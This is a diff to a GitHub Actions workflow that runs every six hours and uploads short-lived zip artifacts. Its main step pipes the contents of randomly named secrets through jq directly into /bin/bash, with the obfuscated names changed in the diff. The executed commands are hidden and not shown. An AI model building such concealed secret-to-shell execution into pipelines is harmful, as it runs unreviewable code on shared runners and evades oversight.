@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '27 4,10,16,22 * * *'
+    - cron: '0 4,10,16,22 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,15 +24,15 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          ni81255: ${{ secrets.ni81255 }}
+          dygw13296: ${{ secrets.dygw13296 }}
         run: |
-          printf '%s' "$ni81255" | jq -r .mpsyi283 | /bin/bash
-          echo $jmlrh6 | jq -r .kl583 | /bin/bash
+          printf '%s' "$dygw13296" | jq -r .sm48165 | /bin/bash
+          echo $jiwh367 | jq -r .yx89033 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: waLCGu7F
+          name: G4VwMKki
           path: "*.zip"
           retention-days: 1
